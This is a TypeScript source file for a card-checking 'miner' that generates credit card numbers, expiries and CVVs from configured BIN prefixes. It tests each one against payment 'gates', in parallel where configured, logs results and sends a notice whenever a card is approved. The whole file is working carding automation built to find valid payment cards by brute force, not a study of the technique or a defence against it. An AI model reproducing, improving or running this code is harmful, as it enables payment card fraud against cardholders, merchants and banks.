import { storage } from "./storage";
import { generateCards } from "./card-generator";
import { runGateCheck } from "./checker";
import { log } from "./index";

export type MinerApprovedFn = (
  card: string,
  result: { status: string; response: string; latency: number },
  gateName: string,
  gateId: string,
) => void;

let minerJob: { stop: () => void } | null = null;

export function isMinerRunning(): boolean { return minerJob !== null; }

export async function resetMinerState(): Promise<void> {
  await storage.updateMinerConfig({ isRunning: false, currentBin: null });
}

async function resolveGate(gateId: string): Promise<any | null> {
  if (gateId === "random") {
    const allGates = await storage.getGateConfigs();
    const active = allGates.filter((g: any) => g.active);
    if (active.length === 0) return null;
    return active[Math.floor(Math.random() * active.length)];
  }
  return storage.getGateConfig(gateId);
}

// Uniform Fisher–Yates shuffle (sort(() => Math.random()-0.5) is biased).
function shuffled<T>(arr: T[]): T[] {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

async function resolveMultipleGates(gateId: string, count: number): Promise<any[]> {
  const allGates = await storage.getGateConfigs();
  const active = allGates.filter((g: any) => g.active);
  if (active.length === 0) return [];
  if (gateId !== "random" && count <= 1) {
    const g = await storage.getGateConfig(gateId);
    return g ? [g] : [];
  }
  const pool = shuffled(active);
  // When a specific gate is selected, honour it as the primary and fill the rest
  // with other random active gates (rather than ignoring the selection entirely).
  if (gateId !== "random") {
    const selected = active.find((g: any) => g.id === gateId);
    if (selected) {
      const rest = pool.filter((g: any) => g.id !== gateId);
      return [selected, ...rest].slice(0, Math.min(count, active.length));
    }
  }
  return pool.slice(0, Math.min(count, pool.length));
}

function pickBestResult(
  results: PromiseSettledResult<{ status: string; response: string; latency: number }>[]
): { result: { status: string; response: string; latency: number }; idx: number } | null {
  let bestApproved: { result: any; idx: number } | null = null;
  let bestDeclined: { result: any; idx: number } | null = null;
  let bestError:    { result: any; idx: number } | null = null;
  for (let i = 0; i < results.length; i++) {
    const r = results[i];
    if (r.status !== "fulfilled") continue;
    if (r.value.status === "approved" && !bestApproved) bestApproved = { result: r.value, idx: i };
    else if (r.value.status === "declined" && !bestDeclined) bestDeclined = { result: r.value, idx: i };
    else if (!bestError) bestError = { result: r.value, idx: i };
  }
  return bestApproved || bestDeclined || bestError || null;
}

export async function startMiner(onApproved: MinerApprovedFn): Promise<{ ok: boolean; reason?: string }> {
  if (minerJob) return { ok: false, reason: "already_running" };

  const config = await storage.getMinerConfig();
  const bins = (config.binList as string[]) || [];
  if (!config.gateId)      return { ok: false, reason: "no_gate" };
  if (bins.length === 0)   return { ok: false, reason: "no_bins" };

  const isRandom = config.gateId === "random";
  const gate = await resolveGate(config.gateId);
  if (!gate)                           return { ok: false, reason: "gate_not_found" };
  if (!isRandom && !gate.active)       return { ok: false, reason: "gate_inactive" };

  await storage.updateMinerConfig({
    isRunning: true,
    startedAt: new Date(),
    stoppedAt: null as any,
    totalTried: 0,
    totalApproved: 0,
    currentBin: bins[0] ?? null,
  });

  const jobRef = { running: true };
  minerJob = { stop: () => { jobRef.running = false; } };

  (async () => {
    let binIdx       = 0;
    let cardsFromBin = 0;
    let delayMs      = 3000;   // refreshed each loop from cfg.delaySecs

    while (jobRef.running) {
      try {
        const cfg = await storage.getMinerConfig();
        if (!cfg.isRunning) break;
        delayMs = (cfg.delaySecs ?? 3) * 1000;

        const binList = (cfg.binList as string[]) || [];
        if (binList.length === 0) { await pause(2000); continue; }

        const binEntry = binList[binIdx % binList.length];
        if (!binEntry) { binIdx = 0; cardsFromBin = 0; continue; }
        // BIN entries can now carry a fixed expiry: "411111", "411111|12|26",
        // "411111|12|2026", or even "411111 12 26". Anything past the BIN
        // gets parsed into month/year and passed to generateCards as an
        // override; bare BINs keep their existing smart-expiry behavior.
        const binParts = binEntry.split(/[|\s/-]+/).map(s => s.trim()).filter(Boolean);
        const bin = binParts[0];
        let fixedMonth: string | undefined;
        let fixedYear: string | undefined;
        if (binParts[1] && /^\d{1,2}$/.test(binParts[1])) {
          const m = parseInt(binParts[1], 10);
          if (m >= 1 && m <= 12) fixedMonth = String(m).padStart(2, "0");
        }
        if (binParts[2] && /^\d{2,4}$/.test(binParts[2])) {
          const y = binParts[2];
          fixedYear = y.length === 2 ? `20${y}` : y;
        }

        const parallel = (cfg as any).parallelGates ?? 1;
        const gates = parallel > 1
          ? await resolveMultipleGates(cfg.gateId!, parallel)
          : [await resolveGate(cfg.gateId!)].filter(Boolean);
        if (gates.length === 0) { await pause(2000); continue; }

        await storage.updateMinerConfig({ currentBin: binEntry });

        const [gen] = generateCards(bin, 1, { month: fixedMonth, year: fixedYear });
        const cardFull = `${gen.number}|${gen.expiryMonth}|${gen.expiryYear}|${gen.cvv}`;

        let result: { status: string; response: string; latency: number };
        let winGate = gates[0];

        if (gates.length === 1) {
          result = await runGateCheck(cardFull, gates[0], true);
        } else {
          const settled = await Promise.allSettled(
            gates.map(g => runGateCheck(cardFull, g, true))
          );
          const best = pickBestResult(settled);
          if (!best) { await pause(2000); continue; }
          result = best.result;
          winGate = gates[best.idx];
          const gateNames = gates.map((g, i) => {
            const tag = i === best.idx ? "★" : "·";
            return `${tag}${g.name}`;
          }).join(" ");
          log(`[MINER] Parallel ${gates.length}× → ${gateNames} → ${result.status}`, "miner");
        }

        await storage.createCheckResult({
          card: cardFull,
          status: result.status,
          response: result.response,
          gate: winGate.name,
          latency: result.latency,
          checkedBy: "server-miner",
        });

        const newTried    = (cfg.totalTried    ?? 0) + 1;
        const newApproved = (cfg.totalApproved ?? 0) + (result.status === "approved" ? 1 : 0);
        await storage.updateMinerConfig({ totalTried: newTried, totalApproved: newApproved });

        if (result.status === "approved" && cfg.notifyEnabled) {
          onApproved(cardFull, result, winGate.name, winGate.id);
        }

        cardsFromBin++;
        if (cardsFromBin >= (cfg.maxCardsPerBin ?? 50)) {
          binIdx++;
          cardsFromBin = 0;
        }
      } catch (err: any) {
        log(`[MINER] ${err.message}`, "miner");
      }

      // Pause using the last-known delay — never re-read the DB here, since a
      // transient read error outside the try would otherwise kill the miner.
      if (jobRef.running) await pause(delayMs);
    }

    minerJob = null;
    await storage.updateMinerConfig({ isRunning: false, stoppedAt: new Date(), currentBin: null });
    log("[MINER] Stopped", "miner");
  })().catch(async (err: any) => {
    log(`[MINER CRASH] ${err.message}`, "miner");
    minerJob = null;
    await storage.updateMinerConfig({ isRunning: false, stoppedAt: new Date(), currentBin: null });
  });

  return { ok: true };
}

export async function stopMiner(): Promise<void> {
  if (minerJob) { minerJob.stop(); minerJob = null; }
  await storage.updateMinerConfig({ isRunning: false, stoppedAt: new Date(), currentBin: null });
}

function pause(ms: number): Promise<void> {
  return new Promise(r => setTimeout(r, ms));
}
